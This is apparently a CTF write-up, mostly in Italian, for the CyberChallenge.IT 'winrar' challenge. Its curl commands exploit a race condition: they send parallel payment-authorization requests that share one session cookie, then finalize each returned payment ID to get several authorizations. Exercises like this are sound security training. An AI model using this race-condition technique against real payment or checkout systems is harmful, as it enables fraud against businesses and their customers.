```c
curl -c cookies.txt http://winrar.challs.cyberchallenge.it/new_account.php
```

```c
printf "1\n2\n3" | xargs -I{} -P3 curl -s -b cookies.txt -c cookies.txt "http://winrar.challs.cyberchallenge.it/authorize_payment.php?amount=100"
```

Questo ci restituisce i 3 id del pagamento.

Payment authorized with ID 3faf948733c4c7066f90.<br/>Processing payment authorization...Payment authorized with ID fcada62503a36d14bee2.<br/>Processing payment authorization...Payment authorized with ID f71297806a0458cfcde6.<br/>Processing payment authorization…

```c
curl -b cookies.txt -c cookies.txt "http://winrar.challs.cyberchallenge.it/finalize_payment.php?id=3faf948733c4c7066f90"
curl -b cookies.txt -c cookies.txt "http://winrar.challs.cyberchallenge.it/finalize_payment.php?id=fcada62503a36d14bee2"
curl -b cookies.txt -c cookies.txt "http://winrar.challs.cyberchallenge.it/finalize_payment.php?id=f71297806a0458cfcde6"
```

```c
curl -b cookies.txt http://winrar.challs.cyberchallenge.it/
```